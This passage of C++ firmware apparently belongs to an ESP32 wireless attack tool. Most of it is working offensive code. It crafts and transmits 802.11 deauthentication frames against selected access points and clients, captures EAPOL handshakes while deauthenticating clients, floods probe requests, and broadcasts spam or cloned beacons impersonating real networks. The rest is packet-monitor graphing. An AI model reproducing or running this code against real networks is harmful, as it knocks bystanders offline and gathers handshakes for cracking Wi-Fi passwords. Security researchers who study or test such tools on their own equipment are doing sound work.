  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
  // Itterate through all access points in list
  // Check if active
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build packet

  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
        &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet

      sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
            &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
      
      deauth_frame_default[10] = access_points->get(i).bssid[0];
      deauth_frame_default[11] = access_points->get(i).bssid[1];
      deauth_frame_default[12] = access_points->get(i).bssid[2];
      deauth_frame_default[13] = access_points->get(i).bssid[3];
      deauth_frame_default[14] = access_points->get(i).bssid[4];
      deauth_frame_default[15] = access_points->get(i).bssid[5];

      deauth_frame_default[16] = access_points->get(i).bssid[0];
      deauth_frame_default[17] = access_points->get(i).bssid[1];
      deauth_frame_default[18] = access_points->get(i).bssid[2];
      deauth_frame_default[19] = access_points->get(i).bssid[3];
      deauth_frame_default[20] = access_points->get(i).bssid[4];
      deauth_frame_default[21] = access_points->get(i).bssid[5];      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

      packets_sent = packets_sent + 3;
    }
  }
}


void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_ILI9341
      if (snifferPacket->payload[0] == 0x80)
      {
        num_beacon++;
      }
      else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
      {
        num_deauth++;
      }
      else if (snifferPacket->payload[0] == 0x40)
      {
        num_probe++;
      }
    #endif

    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    display_string.concat(addr);

    int temp_len = display_string.length();

    #ifdef HAS_SCREEN
      for (int i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }
    
      //Serial.print(" ");
    
      #ifdef SCREEN_BUFFER
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
          Serial.println(display_string);
        }
      #endif
    #endif

    buffer_obj.append(snifferPacket, len);
  }
}

void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  bool send_deauth = false; //settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  // Found beacon frame. Decide whether to deauth
  if (send_deauth) {
    if (snifferPacket->payload[0] == 0x80) {    
      // Build packet
      
      wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
    
      wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
      wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
      wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
      wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
      wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
      wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
    
      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
      delay(1);
    }


  }

  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

    char addr[] = "00:00:00:00:00:00";
    getMAC(addr, snifferPacket->payload, 10);
    display_string.concat(addr);

    int temp_len = display_string.length();

   #ifdef HAS_SCREEN
      for (int i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }

      Serial.print(" ");

      #ifdef SCREEN_BUFFER
        if (display_obj.display_buffer->size() == 0)
        {
          display_obj.loading = true;
          display_obj.display_buffer->add(display_string);
          display_obj.loading = false;
        }
      #endif
    #else
      Serial.println(addr);    
    #endif
  }

  buffer_obj.append(snifferPacket, len);
}

void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;

  bool send_deauth = false; //settings_obj.loadSetting<bool>(text_table4[5]);
  
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;
  }
  
  // Found beacon frame. Decide whether to deauth

  if (snifferPacket->payload[0] == 0x80) {   

    // Do target stuff
    if (wifi_scan_obj.currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
      bool found = false;

      // Check list of APs
      for (int i = 0; i < access_points->size(); i++) {
        if (access_points->get(i).selected) {
          uint8_t addr[] = {snifferPacket->payload[10],
                            snifferPacket->payload[11],
                            snifferPacket->payload[12],
                            snifferPacket->payload[13],
                            snifferPacket->payload[14],
                            snifferPacket->payload[15]};
          // Compare AP bssid to ssid of recvd packet
          for (int x = 0; x < 6; x++) {
            if (addr[x] != access_points->get(i).bssid[x]) {
              found = false;
              break;
            }
            else
              found = true;
          }
          if (found) {
            Serial.println("Received beacon from " + access_points->get(i).essid + ". Deauthenticating...");
            break;
          }
        }
      }
      if (!found)
        return;      
    } // End targeted stuff 
    // Build packet
    
    wifi_scan_obj.deauth_frame_default[10] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[11] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[12] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[13] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[14] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[15] = snifferPacket->payload[15];
  
    wifi_scan_obj.deauth_frame_default[16] = snifferPacket->payload[10];
    wifi_scan_obj.deauth_frame_default[17] = snifferPacket->payload[11];
    wifi_scan_obj.deauth_frame_default[18] = snifferPacket->payload[12];
    wifi_scan_obj.deauth_frame_default[19] = snifferPacket->payload[13];
    wifi_scan_obj.deauth_frame_default[20] = snifferPacket->payload[14];
    wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
  
    // Send packet
    esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
    delay(1);
  }



  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
    num_eapol++;
    Serial.println("Received EAPOL:");

  }

  buffer_obj.append(snifferPacket, len);
}

#ifdef HAS_SCREEN
  void WiFiScan::eapolMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
  
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
  
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
  
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
  
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
  
          // Channel - button pressed
          if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= (GRAPH_REFRESH * 5)) {
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_eapol * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        if (y_pos_x >= HEIGHT_1) {
          Serial.println("Max EAPOL number reached. Adjusting...");
          num_eapol = 0;
        }
  
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_CYAN);
  
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
  
        //tftDisplayTime();
  
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
  
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        //y_pos_y_old = y_pos_y;
        //y_pos_z_old = y_pos_z;
  
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
  
    }
  
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawEapolColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }

  void WiFiScan::packetMonitorMain(uint32_t currentTime)
  {
    //---------MAIN 'FOR' LOOP! THIS IS WHERE ALL THE ACTION HAPPENS! HAS TO BE FAST!!!!!---------\\
    
    
  //  for (x_pos = (11 + x_scale); x_pos <= 320; x_pos += x_scale) //go along every point on the x axis and do something, start over when finished
    for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
    {
      currentTime = millis();
      do_break = false;
      
      y_pos_x = 0;
      y_pos_y = 0;
      y_pos_z = 0;
      boolean pressed = false;
      
      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
  
      // Do the touch stuff
      #ifdef HAS_ILI9341
        pressed = display_obj.tft.getTouch(&t_x, &t_y);
      #endif
  
      if (pressed) {
        Serial.print("Got touch | X: ");
        Serial.print(t_x);
        Serial.print(" Y: ");
        Serial.println(t_y);
      }
  
  
      // Check buttons for presses
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (pressed && display_obj.key[b].contains(t_x, t_y))
        {
          display_obj.key[b].press(true);
        } else {
          display_obj.key[b].press(false);
        }
      }
      
      // Which buttons pressed
      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
      {
        if (display_obj.key[b].justPressed())
        {
          Serial.println("Bro, key pressed");
          //do_break = true;
        }
  
        if (display_obj.key[b].justReleased())
        {
          do_break = true;
          
          // X - button pressed
          if (b == 0) {
            if (x_scale > 1) {
              x_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
          // X + button pressed
          else if (b == 1) {
            if (x_scale < 6) {
              x_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              break;
            }
          }
  
          // Y - button pressed
          else if (b == 2) {
            if (y_scale > 1) {
              y_scale--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Y + button pressed
          else if (b == 3) {
            if (y_scale < 9) {
              y_scale++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              //updateMidway();
              break;
            }
          }
  
          // Channel - button pressed
          else if (b == 4) {
            if (set_channel > 1) {
              Serial.println("Shit channel down");
              set_channel--;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
  
          // Channel + button pressed
          else if (b == 5) {
            if (set_channel < MAX_CHANNEL) {
              Serial.println("Shit channel up");
              set_channel++;
              delay(70);
              display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK);
              display_obj.tftDrawXScaleButtons(x_scale);
              display_obj.tftDrawYScaleButtons(y_scale);
              display_obj.tftDrawChannelScaleButtons(set_channel);
              display_obj.tftDrawExitScaleButtons();
              changeChannel();
              break;
            }
          }
          else if (b == 6) {
            Serial.println("Exiting packet monitor...");
            this->StartScan(WIFI_SCAN_OFF);
            //display_obj.tft.init();
            this->orient_display = true;
            return;
          }
        }
      }
  
      if (currentTime - initTime >= GRAPH_REFRESH) {
        //Serial.println("-----------------------------------------");
        //Serial.println("Time elapsed: " + (String)(currentTime - initTime) + "ms");
        x_pos += x_scale;
        initTime = millis();
        y_pos_x = ((-num_beacon * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
        y_pos_y = ((-num_deauth * (y_scale * 3)) + (HEIGHT_1 - 2)); // RED
        y_pos_z = ((-num_probe * (y_scale * 3)) + (HEIGHT_1 - 2)); // BLUE
  
        //Serial.println("num_beacon: " + (String)num_beacon);
        //Serial.println("num_deauth: " + (String)num_deauth);
        //Serial.println(" num_probe: " + (String)num_probe);
    
        num_beacon = 0;
        num_probe = 0;
        num_deauth = 0;
        
        //CODE FOR PLOTTING CONTINUOUS LINES!!!!!!!!!!!!
        //Plot "X" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_x_old, x_pos, y_pos_x, TFT_GREEN);
        //Plot "Z" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_z_old, x_pos, y_pos_z, TFT_BLUE);
        //Plot "Y" value
        display_obj.tft.drawLine(x_pos - x_scale, y_pos_y_old, x_pos, y_pos_y, TFT_RED);
        
        //Draw preceding black 'boxes' to erase old plot lines, !!!WEIRD CODE TO COMPENSATE FOR BUTTONS AND COLOR KEY SO 'ERASER' DOESN'T ERASE BUTTONS AND COLOR KEY!!!
        //if ((x_pos <= 90) || ((x_pos >= 198) && (x_pos <= 320))) //above x axis
        if ((x_pos <= 90) || ((x_pos >= 117) && (x_pos <= 320))) //above x axis
        {
          display_obj.tft.fillRect(x_pos+1, 28, 10, 93, TFT_BLACK); //compensate for buttons!
        }
        else
        {
          display_obj.tft.fillRect(x_pos+1, 0, 10, 121, TFT_BLACK); //don't compensate for buttons!
        }
        //if ((x_pos >= 254) && (x_pos <= 320)) //below x axis
        //if (x_pos <= 90)
        if (x_pos < 0) // below x axis
        {
          //tft.fillRect(x_pos+1, 121, 10, 88, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 88, TFT_CYAN);
        }
        else
        {
          //tft.fillRect(x_pos+1, 121, 10, 119, TFT_BLACK);
          display_obj.tft.fillRect(x_pos+1, 121, 10, 118, TFT_BLACK);
        }
        
        //tftDisplayTime();
        
        if ( (y_pos_x == 120) || (y_pos_y == 120) || (y_pos_z == 120) )
        {
          display_obj.tft.drawFastHLine(10, 120, 310, TFT_WHITE); // x axis
        }
         
        y_pos_x_old = y_pos_x; //set old y pos values to current y pos values 
        y_pos_y_old = y_pos_y;
        y_pos_z_old = y_pos_z;
    
        //delay(50);
      }
  
      #ifdef HAS_SD
        sd_obj.main();
      #endif
     
    }
    
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); //erase XY buttons and any lines behind them
    //tft.fillRect(56, 0, 66, 32, TFT_ORANGE); //erase time and color key and any stray lines behind them
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // key
    
    display_obj.tftDrawXScaleButtons(x_scale); //redraw stuff
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
    display_obj.tftDrawColorKey();
    display_obj.tftDrawGraphObjects(x_scale);
  }
#endif

//void WiFiScan::sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
//  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
//  showMetadata(snifferPacket, type);
//}

void WiFiScan::changeChannel(int chan) {
  this->set_channel = chan;
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

void WiFiScan::changeChannel()
{
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

// Function to cycle to the next channel
void WiFiScan::channelHop()
{
  this->set_channel = this->set_channel + 1;
  if (this->set_channel > 13) {
    this->set_channel = 1;
  }
  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
}

char* WiFiScan::stringToChar(String string) {
  char buf[string.length() + 1] = {};
  string.toCharArray(buf, string.length() + 1);

  return buf;
}


// Function for updating scan status
void WiFiScan::main(uint32_t currentTime)
{
  // WiFi operations
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_ALL))
  {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }
  }
  else if (currentScanMode == WIFI_SCAN_WAR_DRIVE) {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
    }
  }

  else if (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
    if (currentTime - initTime >= this->channel_hop_delay * 1000)
    {
      initTime = millis();
      channelHop();
    }  
  }
  else if (currentScanMode == WIFI_ATTACK_AUTH) {
    for (int i = 0; i < 55; i++)
      this->sendProbeAttack(currentTime);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthAttack(currentTime, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) {
    for (int i = 0; i < 55; i++)
      this->sendDeauthFrame(this->src_mac, this->set_channel, this->dst_mac);

    if (currentTime - initTime >= 1000) {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) {
    // Loop through each AP
    for (int x = 0; x < access_points->size(); x++) {
      // Only get selected APs
      if (access_points->get(x).selected) {
        AccessPoint cur_ap = access_points->get(x);
        // Loop through each AP's Station
        for (int i = 0; i < cur_ap.stations->size(); i++) {
          // Only get selected Stations
          if (stations->get(cur_ap.stations->get(i)).selected) {
            Station cur_sta = stations->get(cur_ap.stations->get(i));

            // Send deauths for each selected AP's selected Station
            for (int y = 0; y < 25; y++)
              this->sendDeauthFrame(cur_ap.bssid, cur_ap.channel, cur_sta.mac);

            // Display packets sent on screen
            if (currentTime - initTime >= 1000) {
              initTime = millis();
              String displayString = "";
              String displayString2 = "";
              displayString.concat(text18);
              displayString.concat(packets_sent);
              for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
                displayString2.concat(" ");
              packets_sent = 0;
            }
          }
        }
      }
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_MIMIC)) {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected)
        this->broadcastCustomBeacon(currentTime, ssid{access_points->get(i).essid, random(1, 12), {random(256), 
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256),
                                                                                                   random(256)}});
    }
      

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
  {
    // Need this for loop because getTouch causes ~10ms delay
    // which makes beacon spam less effective
    for (int i = 0; i < 55; i++)
      broadcastRandomSSID(currentTime);

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      //Serial.print("packets/sec: ");
      //Serial.println(packets_sent);
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
        displayString2.concat(" ");
      packets_sent = 0;
    }
  }
  else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST)) {
    for (int i = 0; i < ssids->size(); i++)
      this->broadcastCustomBeacon(currentTime, ssids->get(i));

    if (currentTime - initTime >= 1000)
    {
      initTime = millis();
      String displayString = "";
      String displayString2 = "";
      displayString.concat(text18);
      displayString.concat(packets_sent);
